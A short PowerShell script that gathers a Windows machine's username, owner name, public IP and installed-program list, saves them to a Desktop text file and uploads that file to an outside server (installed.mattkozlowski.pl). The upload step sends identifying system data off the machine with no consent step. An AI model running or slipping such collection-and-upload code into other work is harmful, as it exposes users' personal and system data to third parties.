$user = Get-WMIObject -ClassName Win32_ComputerSystem
# $pc_name = [System.Net.Dns]::GetHostName()
$public_ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content

#local ip
# $ip =  Get-NetIPAddress -AddressFamily IPV4
# Write-Host $ip.IPAddress

Write-Host $user.Username
Write-Host $user.PrimaryOwnerName
Write-Host $public_ip

$list = Get-WmiObject -Class Win32_Product | Select Name, Version


$dir = [Environment]::GetFolderPath("Desktop")
$file_name = "installed-programs.txt"
$file_path = $dir + "\installed-programs.txt"


New-Item -Path $dir -Name $file_name -Value "INSTALLED PROGRAMS (by Matt 0.01b):" -Force
Add-Content $file_path -Value " "
Add-Content $file_path -Value $user.Username
Add-Content $file_path -Value $user.PrimaryOwnerName
Add-Content $file_path -Value $public_ip


foreach ($l in $list) {
    $v = $l.Name + " " + $l.Version
    Add-Content $file_path -Value $v
}


$wc = New-Object System.Net.WebClient
$resp = $wc.UploadFile("https://installed.mattkozlowski.pl/upload",$file_path)
Write-Host $resp
